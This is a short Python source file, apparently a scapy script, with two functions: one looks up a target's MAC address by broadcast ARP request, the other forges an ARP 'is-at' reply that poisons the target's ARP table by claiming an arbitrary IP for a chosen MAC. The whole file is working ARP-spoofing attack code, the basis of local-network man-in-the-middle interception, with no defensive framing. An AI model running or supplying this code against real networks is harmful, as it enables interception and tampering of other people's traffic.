from scapy.all import Ether , ARP,conf, get_if_addr , get_if_hwaddr,srp1,sendp
BROADCASTMAC = "ff:ff:ff:ff:ff:ff"

def getTargetMac(target : str , interface : str )->str : 
    etherAttack = Ether(dst =BROADCASTMAC)
    arpAttack = ARP(pdst = target  , op = "who-has" )
    reply = srp1(etherAttack/arpAttack , iface = interface,verbose=False)
    return reply[Ether].src

def changeArpTable( target : str , src :str , srcMac : str ,interface : str )->None:
    etherAttack = Ether(dst =getTargetMac(target,interface) , src = srcMac)
    arpAttack = ARP(pdst = target , psrc = src, op = "is-at" )
    (etherAttack/arpAttack).show()
    sendp(etherAttack/arpAttack , iface=interface,verbose=False)
 